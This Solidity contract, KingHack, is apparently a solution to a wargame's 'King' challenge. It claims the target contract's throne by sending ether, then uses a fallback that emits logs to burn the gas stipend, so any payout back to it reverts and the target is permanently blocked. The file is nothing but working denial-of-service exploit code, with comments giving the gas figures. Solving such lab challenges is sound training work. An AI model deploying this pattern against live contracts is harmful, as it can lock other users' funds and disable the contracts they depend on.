pragma solidity ^0.4.18;

import "zeppelin/contracts/ownership/Ownable.sol";
import "levels/King.sol";

contract KingHack {
    address public mywallet;
    event log(uint256 val);
    
    constructor() public {}
    
    function attack(address _instance) public payable {
        _instance.call.value(msg.value).gas(gasleft())();
        mywallet = msg.sender;
    }

    function () public payable {   
        // waste stipend gasleft of 3321 gas
        // each emit gasleft() cost 1066 gas
        emit log(gasleft()); 
        emit log(gasleft()); 
        emit log(gasleft());
    }
}